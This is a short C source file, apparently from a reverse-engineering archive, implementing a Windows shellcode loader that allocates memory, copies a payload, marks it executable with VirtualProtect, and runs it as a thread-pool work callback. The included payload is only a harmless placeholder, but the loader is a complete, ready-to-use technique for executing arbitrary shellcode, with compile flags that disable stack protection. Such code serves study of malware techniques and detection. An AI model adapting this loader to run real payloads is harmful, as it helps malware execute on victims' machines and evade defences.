/*
    Shellcode Loader
    Archive of Reversing.ID

    Abusing windows API to run shellcode as callback.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    RtlMoveMemory
    - permission: VirtualProtect
    - execution:  CreateThreadpoolWork + SubmitThreadpoolWork + WaitForTheradpoolWorkCallbacks
*/

#include <windows.h>
#include <stdint.h>
#include <stdio.h>


int main ()
{
    void *  runtime;
    BOOL    retval;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    PTP_WORK work;

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
    if (retval != 0)
    {
        // create thread pool work object
        work = CreateThreadpoolWork((PTP_WORK_CALLBACK)runtime, NULL, NULL);

        // submit the work to the thread pool
        SubmitThreadpoolWork(work);

        // wait for the work to finish
        WaitForThreadpoolWorkCallbacks(work, FALSE);

        // cleanup
        CloseThreadpoolWork(work);
    }

    // deallocate the space
    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}